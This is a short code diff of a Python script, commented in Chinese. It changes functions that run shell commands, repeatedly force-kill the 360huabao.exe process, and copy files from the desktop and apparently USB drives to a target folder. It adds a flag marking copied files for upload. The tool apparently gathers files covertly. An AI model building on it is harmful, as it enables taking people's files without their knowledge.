@@ -32,7 +32,7 @@ def cmd(cmdline:str):
 cmdline(str):命令行'''
     res = subprocess.run(cmdline,shell=True)
     if res.returncode == 0:
-        log('I',f'命令执行成功: {cmdline}')
+        log('D',f'命令执行成功: {cmdline}')
     else:
         log('W',f'执行 {cmdline} 时发生 {res.returncode}\n{res.stdout}\n{res.stderr}')
 def upancopy():
@@ -90,7 +90,7 @@ isfilter(bool):是否过滤后缀名'''
 def kill360():
     '''自动杀死360画报'''
     while True:
-        os.popen('taskkill /f /im 360huabao.exe').close()
+        cmd('taskkill /f /im 360huabao.exe')
         time.sleep(KILL360SLEEP)
 def log(logtype:str,logtext:str):
     '''输出日志
@@ -102,6 +102,7 @@ logtext(str):日志内容'''
         print(content,file=logfile)
 def deskcopy():
     '''桌面复制'''
+    global isneedupload
     filesizes = []
     for i in os.listdir():
         filesizes.append(os.stat(i).st_size)
@@ -109,6 +110,7 @@ def deskcopy():
         for i in os.listdir():
             if os.stat(i).st_size not in filesizes:
                 copy('.',TARGET,isfilter=False)
+                isneedupload = True
                 filesizes = []
                 for j in os.listdir():
                     filesizes.append(os.stat(j).st_size)
